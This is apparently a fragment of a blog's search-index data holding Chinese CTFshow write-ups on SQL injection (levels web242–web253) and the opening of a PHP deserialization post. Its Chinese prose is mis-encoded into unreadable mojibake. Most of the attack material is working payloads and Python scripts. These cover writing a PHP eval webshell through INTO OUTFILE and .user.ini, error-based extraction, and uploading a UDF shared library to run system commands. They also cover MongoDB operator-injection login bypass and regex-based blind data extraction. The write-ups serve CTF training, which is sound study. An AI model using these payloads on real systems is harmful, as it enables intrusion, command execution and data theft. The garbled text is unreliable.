if\né‚£æˆ‘ä»¬æ€ä¹ˆæµ‹è¯•è¿™ä¸ªæ—¶é—´å‘¢ï¼Œè¿™é‡Œæ”¾ä¸€ä¸ªå¤§ä½¬çš„è„šæœ¬\nPractice - CTFSHOW WEBå…¥é—¨ SQLæ³¨å…¥ç¯‡\nurl = \u0026#39;http://58e7b03f-3c20-48e0-a8f8-9a3efa102f6d.challenge.ctf.show:8080/api/delete.php\u0026#39;\rdef test2() -\u0026gt; float:\rrand = random.random()\rtime_s = time.time()\r_ = requests.post(url,data={\u0026#34;id\u0026#34;: f\u0026#34;if({1 if rand \u0026gt; 0.5 else 0},sleep(0.05),0)\u0026#34;})\rtime_e = time.time()\rreturn (rand \u0026gt; 0.5, time_e - time_s)\rprint([test() for _ in range(30)]) æˆ‘æµ‹å‡ºæ¥çš„ç»“æœ\n[(False, 0.09313225746154785), (True, 1.087439775466919), (True, 1.599609375), (True, 1.6065845489501953), (True, 1.6024441719055176), (False, 0.5998048782348633), (False, 0.0730128288269043), (True, 1.0801937580108643), (True, 1.6085357666015625), (False, 0.1298365592956543), (True, 1.089057445526123), (False, 0.6771323680877686), (True, 1.0864779949188232), (True, 1.6023609638214111), (False, 0.07814288139343262), (False, 0.07692098617553711), (False, 0.07593393325805664), (True, 1.082731008529663), (False, 0.07544946670532227), (True, 1.606881856918335), (True, 1.609898567199707), (False, 0.08498406410217285), (True, 1.0778491497039795), (True, 1.0797111988067627), (True, 1.0858359336853027), (False, 0.08560538291931152), (False, 0.08359408378601074), (False, 0.08201932907104492), (False, 0.07815837860107422), (True, 1.085575819015503)] åœ¨falseå’Œtrueä¹‹é—´é€‰å–ä¸€ä¸ªåˆé€‚çš„å€¼å³å¯ï¼Œç›®çš„æ˜¯èƒ½å¤Ÿè¿›è¡ŒåŒºåˆ†ï¼Œæˆ‘è¿™é‡Œé€‰å–äº†0.2\næ–‡ä»¶æ³¨å…¥ web242 1sqlè¯­å¥ 2 3 //å¤‡ä»½è¡¨ 4 $sql = \u0026#34;select * from ctfshow_user into outfile \u0026#39;/var/www/html/dump/{$filename}\u0026#39;;\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 //æ— è¿‡æ»¤ outfileçš„è¯­æ³•\rSELECT ... INTO OUTFILE \u0026#39;file_name\u0026#39;\r[CHARACTER SET charset_name]\r[export_options]\rexport_options:\r[{FIELDS | COLUMNS}\r[TERMINATED BY \u0026#39;string\u0026#39;]//åˆ†éš”ç¬¦\r[[OPTIONALLY] ENCLOSED BY \u0026#39;char\u0026#39;]\r[ESCAPED BY \u0026#39;char\u0026#39;]\r]\r[LINES\r[STARTING BY \u0026#39;string\u0026#39;]\r[TERMINATED BY \u0026#39;string\u0026#39;]\r]\r----------------------------------------------------\râ€œOPTIONâ€å‚æ•°ä¸ºå¯é€‰å‚æ•°é€‰é¡¹ï¼Œå…¶å¯èƒ½çš„å–å€¼æœ‰ï¼š\rFIELDS TERMINATED BY \u0026#39;å­—ç¬¦ä¸²\u0026#39;ï¼šè®¾ç½®å­—ç¬¦ä¸²ä¸ºå­—æ®µä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼æ˜¯â€œ\\tâ€ã€‚\rFIELDS ENCLOSED BY \u0026#39;å­—ç¬¦\u0026#39;ï¼šè®¾ç½®å­—ç¬¦æ¥æ‹¬ä½å­—æ®µçš„å€¼ï¼Œåªèƒ½ä¸ºå•ä¸ªå­—ç¬¦ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•ç¬¦å·ã€‚\rFIELDS OPTIONALLY ENCLOSED BY \u0026#39;å­—ç¬¦\u0026#39;ï¼šè®¾ç½®å­—ç¬¦æ¥æ‹¬ä½CHARã€VARCHARå’ŒTEXTç­‰å­—ç¬¦å‹å­—æ®µã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•ç¬¦å·ã€‚\rFIELDS ESCAPED BY \u0026#39;å­—ç¬¦\u0026#39;ï¼šè®¾ç½®è½¬ä¹‰å­—ç¬¦ï¼Œåªèƒ½ä¸ºå•ä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼ä¸ºâ€œ\\â€ã€‚\rLINES STARTING BY \u0026#39;å­—ç¬¦ä¸²\u0026#39;ï¼šè®¾ç½®æ¯è¡Œæ•°æ®å¼€å¤´çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•å­—ç¬¦ã€‚\rLINES TERMINATED BY \u0026#39;å­—ç¬¦ä¸²\u0026#39;ï¼šè®¾ç½®æ¯è¡Œæ•°æ®ç»“å°¾çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼æ˜¯â€œ\\nâ€ã€‚ æ¼æ´çš„æ³¨å…¥ç‚¹æ˜¯ç”±äºæ•°æ®åº“çš„å¯¼å‡ºåŠŸèƒ½\næ ¹æ®è¿™ä¸ªæˆ‘ä»¬å¯ä»¥å†™å…¥ä¸€å¥è¯æœ¨é©¬\npayload:\nfilename=1.php\u0026#39; LINES STARTING BY \u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39;# web243 1sqlè¯­å¥ 2 3 //å¤‡ä»½è¡¨ 4 $sql = \u0026#34;select * from ctfshow_user into outfile \u0026#39;/var/www/html/dump/{$filename}\u0026#39;;\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 //è¿‡æ»¤äº†php å°è¯•ä¸€ä¸‹.user.iniæ–‡ä»¶åŒ…å«\nfilename=.user.ini\u0026#39; lines starting by \u0026#39;auto_prepend_file=1.txt\\n\u0026#39;%23\rfilename=1.txt\u0026#39; lines starting by \u0026#39;\u0026lt;?=eval($_POST[1])?\u0026gt;\u0026#39;%23 æŠ¥é”™æ³¨å…¥ æ–°æ‰‹å°ç™½å…¥é—¨â€”â€”SQLæ³¨å…¥ä¹‹æŠ¥é”™æ³¨å…¥_sqlæ³¨å…¥æŠ¥é”™æ³¨å…¥-CSDNåšå®¢\nweb244 sqlè¯­å¥\r//å¤‡ä»½è¡¨\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;;\rè¿”å›é€»è¾‘\r//æ— è¿‡æ»¤ updatexmlæŠ¥é”™æ³¨å…¥\npayload\n/api/?id=\u0026#39; or updatexml(1, concat(0x7e, database(), 0x7e), 1)%23\r/api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema = database() limit 1, 1), 0x7e), 1)%23\r/api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = database() and table_name = \u0026#39;ctfshow_flag\u0026#39; limit 1, 1), 0x7e), 1)%23\r/api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = database() and table_name = \u0026#39;ctfshow_flag\u0026#39; limit 1, 1), 0x7e), 1)%23\r/api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select substr(flag, 1, 30) from ctfshow_flag), 0x7e), 1)%23\r#ctfshow{89982b11-5c7d-4215-a78\r/api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select substr(flag, 31, 30) from ctfshow_flag), 0x7e), 1)%23\r#9-a9f8ecc8f1b1}\r# æ•°æ®é•¿åº¦æœ‰é™åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨substræ¥æˆªå–\r//ctfshow{89982b11-5c7d-4215-a789-a9f8ecc8f1b1} web245 1sqlè¯­å¥ 2 3 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 //æ— è¿‡æ»¤ 9 è¿‡æ»¤updatexml extractvalueæŠ¥é”™æ³¨å…¥\npayload\næŸ¥æ•°æ®åº“åï¼šid=\u0026#39; and (select extractvalue(1,concat(0x7e,(select database()))))%23\rçˆ†è¡¨åï¼šid=\u0026#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))%23\r//ctfshow_flagsa\rçˆ†å­—æ®µåï¼šid=\u0026#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#34;ctfshow_flagsa\u0026#34;))))%23\r//flag1\rçˆ†æ•°æ®ï¼š\rid=\u0026#39; and (select extractvalue(1,concat(0x7e,(select substr(group_concat(flag1),1,30) from ctfshow_flagsa))))%23\rid=\u0026#39; and (select extractvalue(1,concat(0x7e,(select substr(group_concat(flag1),31,30) from ctfshow_flagsa))))%23\r//ctfshow{41446106-c47e-434d-a0c0-16ee43375249} web246 1sqlè¯­å¥ 2 3 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 //æ— è¿‡æ»¤ 9 è¿‡æ»¤updatexml extractvalue flooræŠ¥é”™æ³¨å…¥\nåŸç†ï¼šSQLæ³¨å…¥æŠ¥é”™æ³¨å…¥ä¹‹floor()æŠ¥é”™æ³¨å…¥åŸç†åˆ†æ_sqlæ³¨å…¥floor-CSDNåšå®¢\n#è·å–è¡¨å\r1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23\r#è·å–åˆ—å\r1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flags\u0026#39; limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23\r#è·å–æ•°æ®\r1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (flag2) from ctfshow_flags limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23 web247 1sqlè¯­å¥ 2 3 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 //æ— è¿‡æ»¤ 9 è¿‡æ»¤updatexml extractvalue floor è¿™é“é¢˜floorå‡½æ•°ä¹Ÿè¢«banæ‰äº†\næ ¹æ®flooræŠ¥é”™æ³¨å…¥çš„åŸç†ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œä¹‹æ‰€ä»¥ä¼šå‡ºç°é”™è¯¯ä¸»è¦æ˜¯å› ä¸ºç”¨floorå¯¹rand(0)*2è¿›è¡Œå–æ•´ï¼Œç›®çš„è¾“å‡º011011\u0026hellip;çš„ç»“æœï¼Œè€Œæ—¢ç„¶è¿™æ ·æˆ‘ä»¬åªéœ€è¦æ‰¾ä¸€ä¸ªåŒæ ·èƒ½è¿›è¡Œå–æ•´çš„å‡½æ•°æ¥ä»£æ›¿floorå°±okäº†\né™¤äº†floorä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜èƒ½ä½¿ç”¨roundï¼Œceilç­‰\npayload\næŸ¥è¡¨ 1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23\ræŸ¥åˆ— 1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagsa\u0026#39; limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23\ræŸ¥æ•°æ® 1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (`flag?`) from ctfshow_flagsa limit 0,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23 web248 1sqlè¯­å¥ 2 3 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 5 6è¿”å›é€»è¾‘ 7 8 //æ— è¿‡æ»¤, UDFæ³¨å…¥\nctfshow-webå…¥é—¨-sqlæ³¨å…¥-web248-UDF æ³¨å…¥_ctfshow web248-CSDNåšå®¢\næˆ‘ä»¬éœ€è¦å°† UDF çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼ˆxxx.dllæ–‡ä»¶ï¼‰æ”¾åˆ° MySQL çš„æ£€ç´¢ç›®å½•ä¸‹æ‰èƒ½åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°ï¼Œå¯¹äºä¸åŒç‰ˆæœ¬çš„ mysqlï¼Œæ£€ç´¢ç›®å½•æ˜¯ä¸åŒçš„ï¼š\nMySQL \u0026lt; 5.0\tå¯¼å‡ºè·¯å¾„éšæ„ï¼› 5.0 \u0026lt;= MySQL\u0026lt; 5.1\téœ€è¦å¯¼å‡ºè‡³ç›®æ ‡æœåŠ¡å™¨çš„ç³»ç»Ÿç›®å½•ï¼ˆå¦‚ï¼šc:/windows/system32/ï¼‰ 5.1 \u0026lt; MySQL\tå¿…é¡»å¯¼å‡ºåˆ°MySQLå®‰è£…ç›®å½•ä¸‹çš„lib\\pluginæ–‡ä»¶å¤¹ä¸‹\nå †å æ³¨å…¥æŸ¥ç‰ˆæœ¬\n/api/?id=0\u0026#39;;select version();%23 å¤§äº5.1ï¼Œæ¥ç€è¦æŸ¥ç›®å½•è·¯å¾„\n/api/?id=0\u0026#39;;select @@plugin_dir;%23 /usr/lib/mariadb/plugin æ‹¿åˆ°è·¯å¾„ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±å¯ä»¥ä¼ å…¥æˆ‘ä»¬çš„æ¶æ„soæ–‡ä»¶äº†\nsqlmapä¸­æœ‰å·²ç»å†™å¥½çš„ udf æ–‡ä»¶\nå¦‚ï¼Œlib_mysqludf_sys_64.so\nä½†æ˜¯ç”±äºgetä¼ å‚æœ‰é•¿åº¦é™åˆ¶ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œåˆ†æ®µä¼ å‚\næ”¾ä¸€ä¸ªå›½å¤–å¤§ä½¬çš„è„šæœ¬ï¼Œå°†udfæ–‡ä»¶åˆ†æ®µä¸Šä¼ åå†è¿›è¡Œåˆå¹¶å³å¯\nimport requests\rurl=\u0026#34;http://449c0852-2873-4a47-9eb4-a854915a6b40.challenge.ctf.show/api/\u0026#34;\rudf=\u0026#34;\u0026#34;\rudfs=[]\rfor i in range(0,len(udf),5000):\rudfs.append(udf[i:i+5000])\r#å†™å…¥å¤šä¸ªæ–‡ä»¶ä¸­\rfor i in udfs:\rurl1=url+f\u0026#34;?id=1\u0026#39;;SELECT \u0026#39;{i}\u0026#39; into dumpfile \u0026#39;/tmp/\u0026#34;+str(udfs.index(i))+\u0026#34;.txt\u0026#39;%23\u0026#34;\rrequests.get(url1)\r#åˆå¹¶æ–‡ä»¶ç”Ÿæˆsoæ–‡ä»¶\rurl2=url+\u0026#34;?id=1\u0026#39;;SELECT unhex(concat(load_file(\u0026#39;/tmp/0.txt\u0026#39;),load_file(\u0026#39;/tmp/1.txt\u0026#39;),load_file(\u0026#39;/tmp/2.txt\u0026#39;),load_file(\u0026#39;/tmp/3.txt\u0026#39;))) into dumpfile \u0026#39;/usr/lib/mariadb/plugin/hack.so\u0026#39;%23\u0026#34;\rrequests.get(url2)\r#åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶æ‰§è¡Œæ¶æ„å‘½ä»¤\rrequests.get(url+\u0026#34;?id=1\u0026#39;;create function sys_eval returns string soname \u0026#39;hack.so\u0026#39;%23\u0026#34;)\rr=requests.get(url+\u0026#34;?id=1\u0026#39;;select sys_eval(\u0026#39;cat /f*\u0026#39;)%23\u0026#34;)\rprint(r.text) web249 1sqlè¯­å¥ 2 3 //æ—  4 $user = $memcache-\u0026gt;get($id); 5 6è¿”å›é€»è¾‘ 7 8 //æ— è¿‡æ»¤ payload:\n?id[]=flag web250 1sqlè¯­å¥ 2 3 $query = new MongoDB\\Driver\\Query($data); 4 $cursor = $manager-\u0026gt;executeQuery(\u0026#39;ctfshow.ctfshow_user\u0026#39;, $query)-\u0026gt;toArray(); 5 6è¿”å›é€»è¾‘ 7 8 //æ— è¿‡æ»¤ 9 if(count($cursor)\u0026gt;0){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç™»é™†æˆåŠŸ\u0026#39;; 11 array_push($ret[\u0026#39;data\u0026#39;], $flag); 12 } ctfshow-webå…¥é—¨-sqlæ³¨å…¥ï¼ˆweb249-web253ï¼‰nosql æ³¨å…¥_ctfshow web250-CSDNåšå®¢\nåœ¨è¿™äº›æ“ä½œç¬¦ä¸­ï¼Œ$ne å°±æ˜¯æˆ‘ä»¬åœ¨é‡è¨€å¼æ³¨å…¥ä¸­éœ€è¦åˆ©ç”¨åˆ°çš„é‚£ä¸ªï¼Œå®ƒçš„ä½œç”¨æ˜¯å°†ä¸ç­‰äºæŒ‡å®šå€¼çš„æ•°æ®éƒ½æŸ¥è¯¢å‡ºæ¥ï¼Œæ¯”å¦‚ $ne=1 æ—¶å°±æ˜¯å°†æ‰€æœ‰ä¸ç­‰äº 1 çš„æ•°æ®éƒ½æŸ¥è¯¢å‡ºæ¥ã€‚\næ‰€ä»¥payloadå°±æ˜¯\nusername[$ne]=1\u0026amp;password[$ne]=1 ç¯å¢ƒå¥½åƒæœ‰ç‚¹é—®é¢˜ï¼ˆï¼Ÿï¼‰å‰ä¸¤æ¬¡ä¸€ç›´æŸ¥ä¸å‡ºæ¥\nweb251 1sqlè¯­å¥ 2 3 $query = new MongoDB\\Driver\\Query($data); 4 $cursor = $manager-\u0026gt;executeQuery(\u0026#39;ctfshow.ctfshow_user\u0026#39;, $query)-\u0026gt;toArray(); 5 6è¿”å›é€»è¾‘ 7 8 //æ— è¿‡æ»¤ 9 if(count($cursor)\u0026gt;0){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç™»é™†æˆåŠŸ\u0026#39;; 11 array_push($ret[\u0026#39;data\u0026#39;], $flag); 12 } åŒæ ·æ˜¯\nusername[$ne]=1\u0026amp;password[$ne]=1 ç»§ç»­ç”¨ä¸Šä¸€é¢˜çš„ payloadï¼Œè¿”å› admin çš„å¯†ç ï¼Œä½†æ˜¯è¿™æ¬¡çš„å¯†ç é‡Œæ²¡æœ‰ flag\nå¯èƒ½flagåœ¨å…¶ä»–ç”¨æˆ·çš„å¯†ç é‡Œï¼Œæˆ‘ä»¬ç¦ç”¨admin\nusername[$ne]=admin\u0026amp;password[$ne]=1 æ‹¿åˆ°flag\nweb252 1sqlè¯­å¥ 2 3 $query = new MongoDB\\Driver\\Query($data); 4 $cursor = $manager-\u0026gt;executeQuery(\u0026#39;ctfshow.ctfshow_user\u0026#39;, $query)-\u0026gt;toArray(); 5 6è¿”å›é€»è¾‘ 7 8 //æ— è¿‡æ»¤ 9 if(count($cursor)\u0026gt;0){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç™»é™†æˆåŠŸ\u0026#39;; 11 array_push($ret[\u0026#39;data\u0026#39;], $flag); 12 } 13 è¿™é¢˜æœ‰å¾ˆå¤šä¸åŒçš„username\næˆ‘ä»¬å¯ä»¥è€ƒè™‘é‡‡ç”¨æ­£åˆ™åŒ¹é…æ¥ç­›é€‰\nusername[$ne]=1\u0026amp;password[$regex]=ctfshow{ or\nç”¨$gt ï¼ˆå¤§äºï¼‰ä¸€ç›´å°è¯•çŸ¥é“æ‹¿åˆ°æœ‰flagçš„ç”¨æˆ·\nusername[$ne]=admin\u0026amp;password[$ne]=1\rusername[$gt]=admin1\u0026amp;password[$ne]=1\rusername[$gt]=admin2\u0026amp;password[$ne]=1\rusername[$gt]=admin3\u0026amp;password[$ne]=1 or\næ­£åˆ™åŒ¹é…å»æ‰æ‰€æœ‰ä¸ºadminå¼€å¤´çš„ç”¨æˆ·\nusername[$regex]=^[^admin].*$\u0026amp;password[$ne]=1 web253 1sqlè¯­å¥ 2 3 //sql 4 db.ctfshow_user.find({username:\u0026#39;$username\u0026#39;,password:\u0026#39;$password\u0026#39;}).pretty() 5 6è¿”å›é€»è¾‘ 7 8 //æ— è¿‡æ»¤ 9 if(count($cursor)\u0026gt;0){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç™»é™†æˆåŠŸ\u0026#39;; 11 array_push($ret[\u0026#39;data\u0026#39;], $flag); 12 } æ–¹æ³•ä¸€ CTFSHOW WEBå…¥é—¨ SQLæ³¨å…¥ç¯‡ - b477eRy - åšå®¢å›­\nçŒœæµ‹åˆ°idä¸ºflagï¼Œç›´æ¥å¸ƒå°”ç›²æ³¨æ‹¿åˆ°flag\nimport string\rimport requests\rurl = \u0026#34;http://5ce4ea0d-afb5-4f1c-9e65-626bdaa6e433.challenge.ctf.show:8080/api/\u0026#34;\rletters = \u0026#34;{}-_\u0026#34; + string.ascii_lowercase + string.digits\rdef valid_pass(password: str) -\u0026gt; bool:\rdata = {\r\u0026#34;username[$regex]\u0026#34;: \u0026#34;flag\u0026#34;,\r\u0026#34;password[$regex]\u0026#34;: f\u0026#34;{password}.*\u0026#34;\r}\rresponse = requests.post(url, data=data)\rreturn \u0026#34;ç™»é™†æˆåŠŸ\u0026#34; in response.json()[\u0026#34;msg\u0026#34;]\rresult = \u0026#34;\u0026#34;\rwhile True:\rfor letter in letters:\rif valid_pass(result + letter):\rresult += letter\rprint(f\u0026#34;[*] result: {result}\u0026#34;)\rbreak æ–¹æ³•äºŒ import requests, time, json\rdef brute(action, username=\u0026#34;\u0026#34;):\rurl = \u0026#34;http://44e163eb-3f69-4641-83b2-5499d9c0d5ed.challenge.ctf.show/api/\u0026#34;\rif action == \u0026#34;username\u0026#34;:\rres = \u0026#34;^[^a]\u0026#34; # admin1çš„passwordä¸ºctfshow666...å¾ˆæ˜æ˜¾ä¸æ˜¯flagï¼Œæ‰€ä»¥ç¦æ‰adminå¼€å¤´çš„ç”¨æˆ·\relse:\rres = \u0026#34;^ctfshow{\u0026#34;\rfor j in range(30):\rflag = False\rfor i in range(127):\rreg = res\rif chr(i) not in \u0026#34;0123456789abcdefghijklmnopqrstuvwxyz-{}:,_\u0026#34;:\rcontinue\rn = chr(i)\rif chr(i) in \u0026#34;-{}:\u0026#34;:\rn = \u0026#34;\\\\\u0026#34;+chr(i)\rprint(chr(i))\rif action == \u0026#34;username\u0026#34;:\rdata = {\u0026#34;username[$regex]\u0026#34;: f\u0026#34;{reg+n}\u0026#34;, \u0026#34;password[$ne]\u0026#34;: f\u0026#34;1\u0026#34;}\relse:\rdata = {\u0026#34;username[$regex]\u0026#34;: f\u0026#34;{username}$\u0026#34;, \u0026#34;password[$regex]\u0026#34;: f\u0026#34;{reg+n}\u0026#34;}\rwhile True:\rtry:\rr = requests.post(url, data=data, timeout=7)\rbreak\rexcept TimeoutError:\rtime.sleep(0.1)\rexcept KeyboardInterrupt:\rexit(0)\rtry:\rresp = json.loads(r.text)\rexcept:\rresp = None\rcontinue\rif resp[\u0026#34;msg\u0026#34;] == \u0026#34;\\u767b\\u9646\\u6210\\u529f\u0026#34;:\rres += chr(i)\rflag = True\rbreak\rif not flag:\rbreak\rprint(res)\rreturn res\rif __name__ == \u0026#39;__main__\u0026#39;:\rusername = brute(\u0026#34;username\u0026#34;)\rprint(f\u0026#34;ç”¨æˆ·åä¸º: {username}\u0026#34;)\rpassword = brute(\u0026#34;password\u0026#34;, username)\rprint(f\u0026#34;ç”¨æˆ·å: {username}\\nå¯†ç : {password}\u0026#34;) ","permalink":"http://localhost:1313/post/ctfshow/ctfshow_sql%E6%B3%A8%E5%85%A5/","summary":"\u003ch4 id=\"æ— è¿‡æ»¤æ³¨å…¥å¯¹è¾“å‡ºå†…å®¹è¿›è¡Œè¿‡æ»¤\"\u003e\u003cstrong\u003eæ— è¿‡æ»¤æ³¨å…¥\u003c/strong\u003eï¼ˆå¯¹è¾“å‡ºå†…å®¹è¿›è¡Œè¿‡æ»¤ï¼‰\u003c/h4\u003e\n\u003ch4 id=\"web171\"\u003eweb171\u003c/h4\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e$sql = \u0026#34;select username,password from user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39; limit 1;\u0026#34;;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eflagæ˜¯å­˜åœ¨äºusernameä¸ºflagçš„ç”¨æˆ·çš„æ•°æ®ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦é€šè¿‡\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e1\u0026#39; or 1=1 --+\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eå³å¯è¾“å‡ºæ‰€æœ‰ç”¨æˆ·æ•°æ®\u003c/p\u003e\n\u003ch4 id=\"web172\"\u003eweb172\u003c/h4\u003e\n\u003cp\u003eç›¸æ¯”ä¸Šä¸€é¢˜ï¼Œè¿™é¢˜å¢åŠ äº†è¿‡æ»¤\u003c/p\u003e","title":"CTFSHOW-SQLæ³¨å…¥-Writeup"},{"content":"PHPçš„é­”æ³•æ–¹æ³• PHP å°†æ‰€æœ‰ä»¥ __ï¼ˆä¸¤ä¸ªä¸‹åˆ’çº¿ï¼‰å¼€å¤´çš„ç±»æ–¹æ³•ä¿ç•™ä¸ºé­”æœ¯æ–¹æ³•ã€‚æ‰€ä»¥åœ¨å®šä¹‰ç±»æ–¹æ³•æ—¶ï¼Œé™¤äº†ä¸Šè¿°é­”æœ¯æ–¹æ³•ï¼Œå»ºè®®ä¸è¦ä»¥ __ ä¸ºå‰ç¼€ã€‚ å¸¸è§çš„é­”æ³•æ–¹æ³•å¦‚ä¸‹ï¼š\n1__construct()ï¼Œç±»çš„æ„é€ å‡½æ•° 2 3__destruct()ï¼Œç±»çš„ææ„å‡½æ•° 4 5__call()ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨ 6 7__callStatic()ï¼Œç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨ 8 9__get()ï¼Œè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨ 10 11__set()ï¼Œè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨ 12 13__isset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨ 14 15__unset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨ã€‚ 16 17__sleep()ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•° 18 19__wakeup()ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•° 20 21__toString()ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³• 22 23__invoke()ï¼Œè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³• 24 25__set_state()ï¼Œè°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ 26 27__clone()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨ 28 29__autoload()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±» 30 31__debugInfo()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯ web254 1\u0026lt;?php 2 3 ?\u0026gt;\u0026#39;; 4 public $code=\u0026#39;xrntkk\u0026#39;; 5} 6 7$poc = new ctfshowvip(); 8echo urlencode(serialize($poc)); web262 å­—ç¬¦ä¸²é€ƒé€¸\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-03 02:37:19 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-03 16:05:38 9# @message.php 10# @email: h1xa@ctfer.com 11# @link: https://ctfer.com 12 13*/ 14 15 16error_reporting(0); 17class message{ 18 public $from; 19 public $msg; 20 public $to; 21 public $token=\u0026#39;user\u0026#39;; 22 public function __construct($f,$m,$t){ 23 $this-\u0026gt;from = $f; 24 $this-\u0026gt;msg = $m; 25 $this-\u0026gt;to = $t; 26 } 27} 28 29$f = $_GET[\u0026#39;f\u0026#39;]; 30$m = $_GET[\u0026#39;m\u0026#39;]; 31$t = $_GET[\u0026#39;t\u0026#39;]; 32 33if(isset($f) \u0026amp;\u0026amp; isset($m) \u0026amp;\u0026amp; isset($t)){ 34 $msg = new message($f,$m,$t); 35 $umsg = str_replace(\u0026#39;fuck\u0026#39;, \u0026#39;loveU\u0026#39;, serialize($msg)); 36 setcookie(\u0026#39;msg\u0026#39;,base64_encode($umsg)); 37 echo 